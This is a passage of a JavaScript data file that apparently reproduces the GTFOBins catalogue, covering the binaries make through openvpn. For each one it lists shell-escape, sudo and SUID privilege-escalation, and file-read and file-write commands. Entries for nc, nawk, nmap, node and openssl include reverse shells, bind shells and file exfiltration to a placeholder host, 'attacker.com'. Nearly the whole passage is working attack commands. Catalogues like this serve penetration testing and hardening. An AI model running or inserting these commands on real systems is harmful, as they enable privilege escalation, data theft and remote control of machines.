                    {
                        code: "COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n",
                    },
                ],
            },
        },
        man: {
            description:
                "This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.",
            functions: {
                shell: [
                    {
                        code: "man man\n!/bin/sh\n",
                    },
                    {
                        description:
                            "This only works for GNU `man` and requires GNU `troff` (`groff` to be installed).",
                        code: "man '-H/bin/sh #' man\n",
                    },
                ],
                "file-read": [
                    {
                        code: "man file_to_read",
                    },
                ],
                sudo: [
                    {
                        code: "sudo man man\n!/bin/sh\n",
                    },
                ],
            },
        },
        mawk: {
            functions: {
                shell: [
                    {
                        code: "mawk 'BEGIN {system(\"/bin/sh\")}'",
                    },
                ],
                "file-write": [
                    {
                        code: "LFILE=file_to_write\nmawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n",
                    },
                ],
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nmawk '//' \"$LFILE\"\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./mawk '//' \"$LFILE\"\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo mawk 'BEGIN {system(\"/bin/sh\")}'",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./mawk 'BEGIN {system(\"/bin/sh\")}'",
                    },
                ],
            },
        },
        minicom: {
            description: "Note that in some versions, `Meta-Z` is used in place of `Ctrl-A`.",
            functions: {
                shell: [
                    {
                        description:
                            "Start the following command to open the TUI interface, then:\n1. press `Ctrl-A o` and select `Filenames and paths`;\n2. press `e`, type `/bin/sh`, then `Enter`;\n3. Press `Esc` twice;\n4. Press `Ctrl-A k` to drop the shell.\nAfter the shell, exit with `Ctrl-A x`.\n",
                        code: "minicom -D /dev/null\n",
                    },
                    {
                        description: "After the shell, exit with `Ctrl-A x`.\n",
                        code: 'TF=$(mktemp)\necho "! exec /bin/sh <$(tty) 1>$(tty) 2>$(tty)" >$TF\nminicom -D /dev/null -S $TF\nreset^J\n',
                    },
                ],
                sudo: [
                    {
                        description:
                            "Start the following command to open the TUI interface, then:\n1. press `Ctrl-A o` and select `Filenames and paths`;\n2. press `e`, type `/bin/sh`, then `Enter`;\n3. Press `Esc` twice;\n4. Press `Ctrl-A k` to drop the shell.\nAfter the shell, exit with `Ctrl-A x`.\n",
                        code: "sudo minicom -D /dev/null\n",
                    },
                ],
                suid: [
                    {
                        description:
                            "Start the following command to open the TUI interface, then:\n1. press `Ctrl-A o` and select `Filenames and paths`;\n2. press `e`, type `/bin/sh -p`, then `Enter`;\n3. Press `Esc` twice;\n4. Press `Ctrl-A k` to drop the shell.\nAfter the shell, exit with `Ctrl-A x`.\n",
                        code: "./minicom -D /dev/null\n",
                    },
                ],
            },
        },
        more: {
            functions: {
                shell: [
                    {
                        code: "TERM= more /etc/profile\n!/bin/sh\n",
                    },
                ],
                "file-read": [
                    {
                        code: "more file_to_read",
                    },
                ],
                suid: [
                    {
                        code: "./more file_to_read",
                    },
                ],
                sudo: [
                    {
                        code: "TERM= sudo more /etc/profile\n!/bin/sh\n",
                    },
                ],
            },
        },
        mosquitto: {
            description:
                "The file is actually parsed and the first wrong line (ending with a newline or a null character) is returned in an error message, thus it may not be suitable for reading arbitrary files",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nmosquitto -c "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./mosquitto -c "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo mosquitto -c "$LFILE"\n',
                    },
                ],
            },
        },
        mount: {
            functions: {
                sudo: [
                    {
                        description:
                            "Exploit the fact that `mount` can be executed via `sudo` to *replace* the `mount` binary with a shell.",
                        code: "sudo mount -o bind /bin/sh /bin/mount\nsudo mount\n",
                    },
                ],
            },
        },
        msfconsole: {
            description: "This allows to spawn a [`ruby`](/gtfobins/ruby/) interpreter.",
            functions: {
                shell: [
                    {
                        code: 'sudo msfconsole\nmsf6 > irb\n>> system("/bin/sh")\n',
                    },
                ],
                sudo: [
                    {
                        code: 'sudo msfconsole\nmsf6 > irb\n>> system("/bin/sh")\n',
                    },
                ],
            },
        },
        msgattrib: {
            description:
                "The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nmsgattrib -P $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo msgattrib -P $LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./msgattrib -P $LFILE\n",
                    },
                ],
            },
        },
        msgcat: {
            description:
                "The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nmsgcat -P $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo msgcat -P $LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./msgcat -P $LFILE\n",
                    },
                ],
            },
        },
        msgconv: {
            description:
                "The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nmsgconv -P $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo msgconv -P $LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./msgconv -P $LFILE\n",
                    },
                ],
            },
        },
        msgfilter: {
            functions: {
                shell: [
                    {
                        description:
                            "Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.",
                        code: "echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'\n",
                    },
                ],
                "file-read": [
                    {
                        description:
                            "The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data. `/bin/cat` can be replaced with any other *filter* program.",
                        code: 'LFILE=file_to_read\nmsgfilter -P -i "LFILE" /bin/cat\n',
                    },
                ],
                sudo: [
                    {
                        description:
                            "Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.",
                        code: "echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'\n",
                    },
                ],
                suid: [
                    {
                        description:
                            "Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.",
                        code: "echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'\n",
                    },
                ],
            },
        },
        msgmerge: {
            description:
                "The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nmsgmerge -P $LFILE /dev/null\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo msgmerge -P $LFILE /dev/null\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./msgmerge -P $LFILE /dev/null\n",
                    },
                ],
            },
        },
        msguniq: {
            description:
                "The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nmsguniq -P $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo msguniq -P $LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./msguniq -P $LFILE\n",
                    },
                ],
            },
        },
        mtr: {
            description: "The read file content is corrupted by error prints.\n",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nmtr --raw -F "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo mtr --raw -F "$LFILE"\n',
                    },
                ],
            },
        },
        multitime: {
            functions: {
                shell: [
                    {
                        code: "multitime /bin/sh",
                    },
                ],
                suid: [
                    {
                        code: "./multitime /bin/sh -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo multitime /bin/sh",
                    },
                ],
            },
        },
        mv: {
            description:
                "This can be used to move and then read or write files from a restricted file systems or with elevated privileges.",
            functions: {
                suid: [
                    {
                        code: 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\n./mv $TF $LFILE\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\nsudo mv $TF $LFILE\n',
                    },
                ],
            },
        },
        mysql: {
            description: "A valid MySQL server must be available.",
            functions: {
                shell: [
                    {
                        code: "mysql -e '\\! /bin/sh'",
                    },
                ],
                sudo: [
                    {
                        code: "sudo mysql -e '\\! /bin/sh'",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./mysql -e '\\! /bin/sh'",
                    },
                ],
                "library-load": [
                    {
                        description:
                            "A MySQL server must accept connections in order for this to work.\n\nThe following loads the `/path/to/lib.so` shared object.\n",
                        code: "mysql --default-auth ../../../../../path/to/lib",
                    },
                ],
            },
        },
        nano: {
            functions: {
                shell: [
                    {
                        code: "nano\n^R^X\nreset; sh 1>&0 2>&0\n",
                    },
                    {
                        description:
                            "The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.",
                        code: "nano -s /bin/sh\n/bin/sh\n^T\n",
                    },
                ],
                "file-write": [
                    {
                        code: "nano file_to_write\nDATA\n^O\n",
                    },
                ],
                "file-read": [
                    {
                        code: "nano file_to_read",
                    },
                ],
                "limited-suid": [
                    {
                        description:
                            "The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.",
                        code: "./nano -s /bin/sh\n/bin/sh\n^T\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo nano\n^R^X\nreset; sh 1>&0 2>&0\n",
                    },
                ],
            },
        },
        nasm: {
            description:
                "The file content is treated as command line options and disclosed throught error messages, so this is not suitable for reading arbitrary binary data.",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nnasm -@ $LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./nasm -@ $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo nasm -@ $LFILE\n",
                    },
                ],
            },
        },
        nawk: {
            functions: {
                shell: [
                    {
                        code: "nawk 'BEGIN {system(\"/bin/sh\")}'",
                    },
                ],
                "non-interactive-reverse-shell": [
                    {
                        description: "Run `nc -l -p 12345` on the attacker box to receive the shell.",
                        code: 'RHOST=attacker.com\nRPORT=12345\nnawk -v RHOST=$RHOST -v RPORT=$RPORT \'BEGIN {\n    s = "/inet/tcp/0/" RHOST "/" RPORT;\n    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}\'\n',
                    },
                ],
                "non-interactive-bind-shell": [
                    {
                        description: "Run `nc target.com 12345` on the attacker box to connect to the shell.",
                        code: 'LPORT=12345\nnawk -v LPORT=$LPORT \'BEGIN {\n    s = "/inet/tcp/" LPORT "/0/0";\n    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}\'\n',
                    },
                ],
                "file-write": [
                    {
                        code: "LFILE=file_to_write\nnawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n",
                    },
                ],
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nnawk '//' \"$LFILE\"\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./nawk '//' \"$LFILE\"\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo nawk 'BEGIN {system(\"/bin/sh\")}'",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./nawk 'BEGIN {system(\"/bin/sh\")}'",
                    },
                ],
            },
        },
        nc: {
            functions: {
                "reverse-shell": [
                    {
                        description:
                            "Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.",
                        code: "RHOST=attacker.com\nRPORT=12345\nnc -e /bin/sh $RHOST $RPORT\n",
                    },
                ],
                "bind-shell": [
                    {
                        description:
                            "Run `nc target.com 12345` on the attacker box to connect to the shell. This only works with netcat traditional.",
                        code: "LPORT=12345\nnc -l -p $LPORT -e /bin/sh\n",
                    },
                ],
                "file-upload": [
                    {
                        description:
                            'Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.',
                        code: 'RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nnc $RHOST $RPORT < "$LFILE"\n',
                    },
                ],
                "file-download": [
                    {
                        description:
                            'Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file.',
                        code: 'LPORT=12345\nLFILE=file_to_save\nnc -l -p $LPORT > "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        description:
                            "Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.",
                        code: "RHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT\n",
                    },
                ],
                "limited-suid": [
                    {
                        description:
                            "Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.",
                        code: "RHOST=attacker.com\nRPORT=12345\n./nc -e /bin/sh $RHOST $RPORT\n",
                    },
                ],
            },
        },
        ncdu: {
            functions: {
                shell: [
                    {
                        code: "ncdu\nb\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo ncdu\nb\n",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./ncdu\nb\n",
                    },
                ],
            },
        },
        ncftp: {
            functions: {
                shell: [
                    {
                        code: "ncftp\n!/bin/sh\n",
                    },
                ],
                suid: [
                    {
                        code: "./ncftp\n!/bin/sh -p\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo ncftp\n!/bin/sh\n",
                    },
                ],
            },
        },
        neofetch: {
            functions: {
                shell: [
                    {
                        code: "TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nneofetch --config $TF\n",
                    },
                ],
                "file-read": [
                    {
                        description:
                            "The file content is used as the logo while some other information is displayed on its right, thus it might not be suitable to read arbitray binary files.",
                        code: "LFILE=file_to_read\nneofetch --ascii $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nsudo neofetch --config $TF\n",
                    },
                ],
            },
        },
        nft: {
            description:
                "The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files. This requires version `nftables` v0.9.0.",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nnft -f "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./nft -f "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo nft -f "$LFILE"\n',
                    },
                ],
            },
        },
        nice: {
            functions: {
                shell: [
                    {
                        code: "nice /bin/sh",
                    },
                ],
                suid: [
                    {
                        code: "./nice /bin/sh -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo nice /bin/sh",
                    },
                ],
            },
        },
        nl: {
            description: "The read file content is corrupted by a leading space added to each line.",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nnl -bn -w1 -s '' $LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./nl -bn -w1 -s '' $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo nl -bn -w1 -s '' $LFILE\n",
                    },
                ],
            },
        },
        nm: {
            description:
                "The file content is treated as command line options and disclosed through error messages, so this is not suitable for reading arbitrary binary data.",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nnm @$LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./nm @$LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo nm @$LFILE\n",
                    },
                ],
            },
        },
        nmap: {
            functions: {
                shell: [
                    {
                        description: "Input echo is disabled.",
                        code: "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nnmap --script=$TF\n",
                    },
                    {
                        description:
                            "The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.",
                        code: "nmap --interactive\nnmap> !sh\n",
                    },
                ],
                "non-interactive-reverse-shell": [
                    {
                        description: "Run ``nc -l -p 12345`` on the attacker box to receive the shell.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp)\necho \'local s=require("socket");\nlocal t=assert(s.tcp());\nt:connect(os.getenv("RHOST"),os.getenv("RPORT"));\nwhile true do\n  local r,x=t:receive();local f=assert(io.popen(r,"r"));\n  local b=assert(f:read("*a"));t:send(b);\nend;\nf:close();t:close();\' > $TF\nnmap --script=$TF\n',
                    },
                ],
                "non-interactive-bind-shell": [
                    {
                        description: "Run `nc target.com 12345` on the attacker box to connect to the shell.",
                        code: 'export LPORT=12345\nTF=$(mktemp)\necho \'local k=require("socket");\nlocal s=assert(k.bind("*",os.getenv("LPORT")));\nlocal c=s:accept();\nwhile true do\n  local r,x=c:receive();local f=assert(io.popen(r,"r"));\n  local b=assert(f:read("*a"));c:send(b);\nend;c:close();f:close();\' > $TF\nnmap --script=$TF\n',
                    },
                ],
                "file-upload": [
                    {
                        description:
                            "Send a local file via TCP. Run `socat -v tcp-listen:8080,reuseaddr,fork - on the attacker box to collect the file or use a proper HTTP server. Note that multiple connections are made to the server. Also, it is important that the port is a commonly used HTTP like 80 or 8080.",
                        code: "RHOST=attacker.com\nRPORT=8080\nLFILE=file_to_send\nnmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE\n",
                    },
                    {
                        description:
                            'Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.',
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nTF=$(mktemp)\necho \'local f=io.open(os.getenv("LFILE"), \'rb\')\nlocal d=f:read("*a")\nio.close(f);\nlocal s=require("socket");\nlocal t=assert(s.tcp());\nt:connect(os.getenv("RHOST"),os.getenv("RPORT"));\nt:send(d);\nt:close();\' > $TF\nnmap --script=$TF\n',
                    },
                ],
                "file-download": [
                    {
                        description:
                            "Fetch a remote file via TCP. Run a proper HTTP server on the attacker box to send the file, e.g., `php -S 0.0.0.0:8080`. Note that multiple connections are made to the server and the result is placed in `$TF/IP/PORT/PATH`. Also, it is important that the port is a commonly used HTTP like 80 or 8080.",
                        code: "RHOST=attacker.com\nRPORT=8080\nTF=$(mktemp -d)\nLFILE=file_to_save\nnmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE\n",
                    },
                    {
                        description:
                            'Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file.',
                        code: 'export LPORT=12345\nexport LFILE=file_to_save\nTF=$(mktemp)\necho \'local k=require("socket");\nlocal s=assert(k.bind("*",os.getenv("LPORT")));\nlocal c=s:accept();\nlocal d,x=c:receive("*a");\nc:close();\nlocal f=io.open(os.getenv("LFILE"), "wb");\nf:write(d);\nio.close(f);\' > $TF\nnmap --script=$TF\n',
                    },
                ],
                "file-write": [
                    {
                        code: 'TF=$(mktemp)\necho \'local f=io.open("file_to_write", "wb"); f:write("data"); io.close(f);\' > $TF\nnmap --script=$TF\n',
                    },
                    {
                        description: "The payload appears inside the regular nmap output.",
                        code: "LFILE=file_to_write\nnmap -oG=$LFILE DATA\n",
                    },
                ],
                "file-read": [
                    {
                        code: 'TF=$(mktemp)\necho \'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);\' > $TF\nnmap --script=$TF\n',
                    },
                    {
                        description:
                            "The file is actually parsed as a list of hosts/networks, lines are leaked through error messages.",
                        code: "nmap -iL file_to_read\n",
                    },
                ],
                sudo: [
                    {
                        description: "Input echo is disabled.",
                        code: "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF\n",
                    },
                    {
                        description:
                            "The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.",
                        code: "sudo nmap --interactive\nnmap> !sh\n",
                    },
                ],
                "limited-suid": [
                    {
                        description: "Input echo is disabled.",
                        code: "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\n./nmap --script=$TF\n",
                    },
                ],
                suid: [
                    {
                        description: "The payload appears inside the regular nmap output.",
                        code: "LFILE=file_to_write\n./nmap -oG=$LFILE DATA\n",
                    },
                ],
            },
        },
        node: {
            functions: {
                shell: [
                    {
                        code: 'node -e \'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})\'\n',
                    },
                ],
                "file-write": [
                    {
                        code: 'node -e \'require("fs").writeFileSync("file_to_write", "DATA")\'',
                    },
                ],
                "file-read": [
                    {
                        code: 'node -e \'process.stdout.write(require("fs").readFileSync("/bin/ls"))\'',
                    },
                ],
                "file-download": [
                    {
                        description: "Fetch a remote file via HTTP GET request.",
                        code: 'export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nnode -e \'require("http").get(process.env.URL, res => res.pipe(require("fs").createWriteStream(process.env.LFILE)))\'\n',
                    },
                ],
                "file-upload": [
                    {
                        description: "Send a local file via HTTP POST request.",
                        code: 'export URL=http://attacker.com\nexport LFILE=file_to_send\nnode -e \'require("fs").createReadStream(process.env.LFILE).pipe(require("http").request(process.env.URL))\'\n',
                    },
                ],
                "reverse-shell": [
                    {
                        description: "Run `nc -l -p 12345` on the attacker box to receive the shell.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nnode -e \'sh = require("child_process").spawn("/bin/sh");\nrequire("net").connect(process.env.RPORT, process.env.RHOST, function () {\n  this.pipe(sh.stdin);\n  sh.stdout.pipe(this);\n  sh.stderr.pipe(this);\n})\'\n',
                    },
                ],
                "bind-shell": [
                    {
                        description: "Run `nc target.com 12345` on the attacker box to connect to the shell.",
                        code: 'export LPORT=12345\nnode -e \'sh = require("child_process").spawn("/bin/sh");\nrequire("net").createServer(function (client) {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n}).listen(process.env.LPORT)\'\n',
                    },
                ],
                suid: [
                    {
                        code: './node -e \'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})\'\n',
                    },
                ],
                sudo: [
                    {
                        code: 'sudo node -e \'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})\'\n',
                    },
                ],
                capabilities: [
                    {
                        code: './node -e \'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})\'\n',
                    },
                ],
            },
        },
        nohup: {
            functions: {
                shell: [
                    {
                        code: 'nohup /bin/sh -c "sh <$(tty) >$(tty) 2>$(tty)"',
                    },
                ],
                command: [
                    {
                        code: "COMMAND='/usr/bin/id'\nnohup \"$COMMAND\"\ncat nohup.out\n",
                    },
                ],
                suid: [
                    {
                        code: './nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"',
                    },
                ],
                sudo: [
                    {
                        code: 'sudo nohup /bin/sh -c "sh <$(tty) >$(tty) 2>$(tty)"',
                    },
                ],
            },
        },
        npm: {
            functions: {
                shell: [
                    {
                        code: "npm exec /bin/sh",
                    },
                    {
                        description:
                            "Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`.",
                        code: 'TF=$(mktemp -d)\necho \'{"scripts": {"preinstall": "/bin/sh"}}\' > $TF/package.json\nnpm -C $TF i\n',
                    },
                ],
                sudo: [
                    {
                        description:
                            "Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`.",
                        code: 'TF=$(mktemp -d)\necho \'{"scripts": {"preinstall": "/bin/sh"}}\' > $TF/package.json\nsudo npm -C $TF --unsafe-perm i\n',
                    },
                ],
            },
        },
        nroff: {
            functions: {
                "file-read": [
                    {
                        description: "The file is typeset and some warning messages may appear.",
                        code: "LFILE=file_to_read\nnroff $LFILE\n",
                    },
                ],
                shell: [
                    {
                        code: "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nGROFF_BIN_PATH=$TF nroff\n",
                    },
                ],
                sudo: [
                    {
                        code: "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nsudo GROFF_BIN_PATH=$TF nroff\n",
                    },
                ],
            },
        },
        nsenter: {
            functions: {
                shell: [
                    {
                        code: "nsenter /bin/sh",
                    },
                ],
                sudo: [
                    {
                        code: "sudo nsenter /bin/sh",
                    },
                ],
            },
        },
        ntpdate: {
            description: "The file is actually parsed and lines are leaked through error messages.",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nntpdate -a x -k $LFILE -d localhost\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo ntpdate -a x -k $LFILE -d localhost\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./ntpdate -a x -k $LFILE -d localhost\n",
                    },
                ],
            },
        },
        octave: {
            description: "The payloads are compatible with GUI.",
            functions: {
                shell: [
                    {
                        code: "octave-cli --eval 'system(\"/bin/sh\")'",
                    },
                ],
                "file-write": [
                    {
                        code: 'octave-cli --eval \'filename = "file_to_write"; fid = fopen(filename, "w"); fputs(fid, "DATA"); fclose(fid);\'',
                    },
                ],
                "file-read": [
                    {
                        code: "octave-cli --eval 'format none; fid = fopen(\"file_to_read\"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'",
                    },
                ],
                sudo: [
                    {
                        code: "sudo octave-cli --eval 'system(\"/bin/sh\")'",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./octave-cli --eval 'system(\"/bin/sh\")'",
                    },
                ],
            },
        },
        od: {
            description:
                "Three spaces are added before each character in the read file, and non-printable chars are printed as backslash escape sequences.",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nod -An -c -w9999 "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./od -An -c -w9999 "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo od -An -c -w9999 "$LFILE"\n',
                    },
                ],
            },
        },
        openssl: {
            functions: {
                "reverse-shell": [
                    {
                        description:
                            "To receive the shell run the following on the attacker box:\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\nCommunication between attacker and target will be encrypted.\n",
                        code: "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n",
                    },
                ],
                "file-upload": [
                    {
                        description:
                            "To collect the file run the following on the attacker box:\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save\n\nSend a local file via TCP. Transmission will be encrypted.\n",
                        code: 'RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nopenssl s_client -quiet -connect $RHOST:$RPORT < "$LFILE"\n',
                    },
                ],
                "file-download": [
                    {
                        description:
                            "To send the file run the following on the attacker box:\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send\n\nFetch a file from a TCP port, transmission will be encrypted.\n",
                        code: 'RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nopenssl s_client -quiet -connect $RHOST:$RPORT > "$LFILE"\n',
                    },
                ],
                "file-write": [
                    {
                        code: 'LFILE=file_to_write\necho DATA | openssl enc -out "$LFILE"\n',
                    },
                    {
                        code: 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\nopenssl enc -in "$TF" -out "$LFILE"\n',
                    },
                ],
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\nopenssl enc -in "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        description:
                            "To receive the shell run the following on the attacker box:\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\nCommunication between attacker and target will be encrypted.\n",
                        code: "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n",
                    },
                    {
                        code: 'LFILE=file_to_write\necho DATA | openssl enc -out "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        description:
                            "To receive the shell run the following on the attacker box:\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\nCommunication between attacker and target will be encrypted.\n",
                        code: "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n",
                    },
                ],
                "library-load": [
                    {
                        code: "openssl req -engine ./lib.so",
                    },
                ],
            },
        },
        openvpn: {
            functions: {
                shell: [
                    {
                        code: "openvpn --dev null --script-security 2 --up '/bin/sh -c sh'\n",
                    },
                ],
                "file-read": [
                    {
                        description:
                            "The file is actually parsed and the first partial wrong line is returned in an error message.",
